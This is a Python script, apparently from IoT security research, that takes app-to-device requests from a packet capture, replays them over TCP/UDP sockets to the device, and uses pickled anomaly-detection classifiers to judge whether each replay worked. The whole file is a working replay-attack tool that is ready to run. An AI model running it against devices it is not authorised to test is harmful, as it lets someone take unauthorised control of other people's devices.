import collections
import math
import string
import sys

import pyshark
from time import sleep
import socket


import nltk
nltk.download('punkt')


class Flow:
    def __init__(self, transport_layer, dst_ip, dst_port, src_port, list_requests: list, list_responses: list):
        self.transport_layer = transport_layer
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.src_port = src_port
        self.list_requests = list_requests
        self.list_responses = list_responses

    def printFlow(self):
        info = 'transport_layer=%s --- dst_port=%s --- ip=%s' % (self.transport_layer, self.dst_port, self.dst_ip)
        print(info)


list_flows = collections.deque()
request = False
capture_path = str(sys.argv[1])
mac_app = str(sys.argv[2])
mac_device = str(sys.argv[3])
delay_time = int(sys.argv[4])
path_Models = str(sys.argv[5])
automatic_detection = str(sys.argv[6])

capture = pyshark.FileCapture(capture_path)

############################################################################################################################
from nltk.tokenize import word_tokenize
from sklearn.feature_extraction.text import HashingVectorizer, CountVectorizer, TfidfTransformer
import pickle

if automatic_detection == "YES":
    try:
        clf_svm = pickle.load(open(path_Models + "/svm.sav", 'rb'))
        clf_if = pickle.load(open(path_Models + "/if.sav", 'rb'))
        clf_ee = pickle.load(open(path_Models + "/ee.sav", 'rb'))
        clf_lo = pickle.load(open(path_Models + "/lo.sav", 'rb'))
        clf_cc = pickle.load(open(path_Models + "/cc.sav", 'rb'))
        f = open(path_Models + "/feature_num.txt", "r")
        max_num_features = int(f.read())
    except:
        print("Models not found")


def tokenizeText(sample):
    return list(set(word_tokenize(sample)))

def anomaly_detection(payload: string, clf, vectorize: bool):
    X_test = [payload]
    if vectorize:
        vectorizer = HashingVectorizer(n_features=max_num_features, tokenizer=tokenizeText)
        X_test = vectorizer.fit_transform([payload]).toarray()
    y_pred_test = clf.predict(X_test)
    if y_pred_test[0] == -1:
        return False  # NO NOVELTY DETECTECTED
    else:
        return True  # NOVELTY DETECTED


############################################################################################################################

def attack():
    global list_flows
    sleep(float(delay_time))
    print('START REPLAY ATTACK')
    print('#######################################################################################')

    for f in list_flows:
        if f.transport_layer == 'TCP':
            aggregated_requests = ""
            for r in f.list_requests:
                aggregated_requests = aggregated_requests + r
            f.list_requests=[aggregated_requests]

    responses_to_test = []
    count_flow = len(list_flows) - 1
    for f in reversed(list_flows):
        # f=list_flows.pop()

        list_requests = f.list_requests
        list_responses = f.list_responses
        if len(list_responses) == 0:
            continue

        buffer_size = len(list_responses[0])
        for r in list_responses:
            if len(r) > buffer_size:
                buffer_size = len(r) // 2

        if f.transport_layer == 'TCP':
            for r in list_responses:
                buffer_size = buffer_size + len(r)//2

        buffer_size = pow(2, math.ceil(math.log2(buffer_size)))

        socket_used = None
        if f.transport_layer == 'TCP':
            socket_used = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            socket_used.connect((f.dst_ip, int(f.dst_port)))
        if f.transport_layer == 'UDP':
            socket_used = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            socket_used.connect((f.dst_ip, int(f.dst_port)))
        socket_used.settimeout(2)

        for r in list_requests:
            received_payload = ''
            payload = r
            socket_used.send(bytes.fromhex(payload))
            print('sent payload=' + bytes.fromhex(payload).decode("ISO-8859-1"))
            print('****************************************************************')

            try:  # TIMEOUT PER LA RICEZIONE
                received_payload = socket_used.recv(buffer_size)
                # print('received payload=' + received_payload.decode('ISO-8859-1'))
                print('received payload=' + received_payload.decode('ISO-8859-1'))
                print('****************************************************************')

                #################################################################################################
                # check_similarity(payload,list_responses)
                # if count_flow==command_flow_num:
                received_payload = received_payload.decode('ISO-8859-1').replace("/", "").replace("+", "")
                responses_to_test.append(received_payload)


                #################################################################################################

            except socket.timeout as e:
                err = e.args[0]
                # this next if/else is a bit redundant, but illustrates how the
                # timeout exception is setup
                # if err == 'timed out':
                # print('REPLAY ATTACK NOT WORKED: TIME EXPIRED')

            except Exception as e1:
                print(e1)
                print('REPLAY ATTACK NOT WORKED: GENERIC ERROR')

                continue
        socket_used.close()



    ####################################################################################
    # response_to_test=findCommandsResponses(responses_to_test)
    ###################################################################################
    # return  #use for test
    if automatic_detection=="NO":
        sys.exit()

    count = 0
    for clf in [clf_svm, clf_if, clf_ee, clf_lo, clf_cc]:
        if len(responses_to_test) == 0:
            print("NO RESPONSE AVAILABLE: REPLAY ATTACK NOT SUCCESSFUL")
            break
        result = False
        if len(responses_to_test) > 3:
            responses_to_test = responses_to_test[0:3]
        for res in responses_to_test:
            if count < 4:
                if anomaly_detection(res, clf, vectorize=True):
                    result = True
                    break
            else:
                if anomaly_detection(res, clf, vectorize=False):
                    result = True
                    break
        if result:
            print('REPLAY ATTACK SUCCESSFUL WITH CLF=' + str(clf))
        else:
            print('REPLAY ATTACK NOT SUCCESSFUL WITH CLF=' + str(clf))

        count += 1

    list_flows = collections.deque()
    print("END REPLAY ATTACK")


# capture.apply_on_packets(packet_callback)
for packet in capture:

    try:
        if packet.transport_layer == None:  # ASSUNZIONE: I PACCHETTI SCAMBIATI CON IL DEVICE HANNO UN LIVELLO DI TRASPORTO
            continue
        payload = ''
        if str(packet.transport_layer) == 'UDP':
            if packet.udp._all_fields.get("udp.payload") == None:
                continue
            payload = packet.udp._all_fields["udp.payload"].replace(":", "")
        if str(packet.transport_layer) == 'TCP':
            if packet.tcp._all_fields.get("tcp.payload") == None:
                continue
            payload = packet.tcp._all_fields["tcp.payload"].replace(":", "")
        if payload == '':
            print('ERROR')

        if len(payload) == 0:
            continue

        # payload = bytes.fromhex(payload).decode('ISO-8859-1')
        # print(payload)
        print(bytes.fromhex(payload).decode('ISO-8859-1'))

        if str(packet.eth._all_fields['eth.src']) == str(mac_app) and str(packet.eth._all_fields['eth.dst']) == str(
                mac_device):

            if not request:
                request = True
                flow = Flow(packet.transport_layer, packet.ip.dst, packet[packet.transport_layer].dstport,
                            packet[packet.transport_layer].srcport, [], [])
                flow.list_requests.append(payload)
                list_flows.append(flow)
            else:
                current_flow = list_flows[len(list_flows) - 1]
                current_flow.list_requests.append(payload)
                list_flows[len(list_flows) - 1] = current_flow
            continue

        if str(packet.eth._all_fields['eth.src']) == str(mac_device) and str(packet.eth._all_fields['eth.dst']) == str(
                mac_app):

            # pck = Packet(packet.transport_layer, packet.highest_layer, packet.ip.dst, packet[packet.transport_layer].srcport,payload,timestamp)
            # print(pck.printConvertedPayload())

            if len(list_flows) == 0:
                # print('FOUND RESPONSE FIRST')  # I MAY IGNORE THIS CASE!
                continue
                # sys.exit(0)
            current_flow = list_flows[len(list_flows) - 1]
            if request:
                request = False
                current_flow.list_responses = []
            current_flow.list_responses.append(payload)
            list_flows[len(list_flows) - 1] = current_flow
    except AttributeError as e:
        print(e)
        continue

if (len(list_flows) < 1):
    print("Error in length list flow")
else:
    attack()
    capture.close()
